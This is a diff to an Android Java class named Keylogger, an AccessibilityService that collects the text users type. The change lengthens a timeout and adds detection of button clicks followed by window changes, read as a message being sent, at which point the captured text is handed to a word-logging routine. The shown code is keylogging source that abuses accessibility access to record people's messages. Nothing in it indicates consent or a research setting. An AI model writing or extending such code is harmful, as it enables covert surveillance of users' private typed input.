@@ -4,13 +4,17 @@ import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
+
 import java.util.List;
 
 public class Keylogger extends AccessibilityService {
     private static final int MAX_BUFFER_SIZE = 1000; // May vary
     private static final double RESET_THRESHOLD = 80.0; // May vary
-    private static final long TIMEOUT_MS = 5000; // May vary
+    private static final long TIMEOUT_MS = 20000; // May vary
+    private static final long MESSAGE_TIMEOUT = 1000; // May Vary
     private String previousText = "";
+    private long lastClickTime = 0;
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
@@ -33,7 +37,25 @@ public class Keylogger extends AccessibilityService {
             cleanBuffer();
         }
 
+        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+            AccessibilityNodeInfo node = event.getSource();
+            if (node != null && node.getClassName().toString().contains("Button")) {
+                lastClickTime = System.currentTimeMillis();
+            }
+        }
+
+        // If window content changes right after a button click, assume it's a send button
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            long currentTime = System.currentTimeMillis();
+            if (currentTime - lastClickTime < MESSAGE_TIMEOUT && !previousText.isEmpty()) {
+                Log.v("Window Content Changed", "Send Button Event: Contents Processed");
+                toLogWords(previousText);
+                previousText = ""; // Reset after logging
+            }
+        }
+
     }
+
 
     private Runnable logTask = null;
     private final Handler handler = new Handler(Looper.getMainLooper());
@@ -72,7 +94,6 @@ public class Keylogger extends AccessibilityService {
     private String cleanText(String text){
         return text.toLowerCase().replaceAll("[^a-z \\n]", "");
     }
-
 
     private WordLogger wordLogger;
 
